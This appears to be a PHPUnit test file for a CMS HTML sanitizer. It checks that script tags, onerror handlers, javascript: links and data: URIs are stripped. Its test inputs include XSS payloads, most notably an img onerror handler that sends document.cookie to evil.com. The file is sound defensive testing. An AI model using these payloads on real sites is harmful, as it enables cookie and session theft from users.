<?php

declare(strict_types=1);

namespace PaginiumCMS\Tests\Core\Security\Services;

use PaginiumCMS\Core\Security\Services\ContentSecuritySanitizer;
use PaginiumCMS\Core\Settings\Contracts\SettingsRepositoryInterface;
use PHPUnit\Framework\TestCase;

class ContentSecuritySanitizerTest extends TestCase
{
    public function testStripsScriptTagsByDefault(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
            'allowedHtmlTags' => 'p,strong,script',
        ]);

        $result = $sanitizer->sanitizeHtml('<p>ok</p><script>alert(1)</script>');

        $this->assertSame('<p>ok</p>', $result);
    }

    public function testAllowsScriptWhenConfigured(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => true,
            'allowedHtmlTags' => 'p,script',
        ]);

        $result = $sanitizer->sanitizeHtml('<p>ok</p><script>alert(1)</script>');

        $this->assertStringContainsString('<script>alert(1)</script>', $result);
    }

    public function testBypassWhenSanitizationDisabled(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => false,
        ]);

        $html = '<script>x</script>';
        $this->assertSame($html, $sanitizer->sanitizeHtml($html));
    }

    public function testStripsOnerrorFromImg(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml(
            '<img src="x" onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">'
        );

        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringContainsString('<img', $result);
    }

    public function testStripsJavascriptHrefFromAnchor(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml('<a href="javascript:alert(document.cookie)">klikni</a>');

        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringContainsString('>klikni</a>', $result);
    }

    public function testStripsDataUriFromImgSrc(): void
    {
        $sanitizer = $this->makeSanitizer([
            'sanitizeHtmlOnSave' => true,
            'allowScriptTags' => false,
        ]);

        $result = $sanitizer->sanitizeHtml('<img src="data:text/html,<script>alert(1)</script>">');

        $this->assertStringNotContainsString('data:', $result);
    }

    /**
     * @param array<string, mixed> $contentSecurity
     */
    private function makeSanitizer(array $contentSecurity): ContentSecuritySanitizer
    {
        $settings = $this->createMock(SettingsRepositoryInterface::class);
        $settings->method('group')->willReturnCallback(
            static fn (string $group): array => $group === 'contentSecurity' ? $contentSecurity : []
        );

        return new ContentSecuritySanitizer($settings);
    }
}
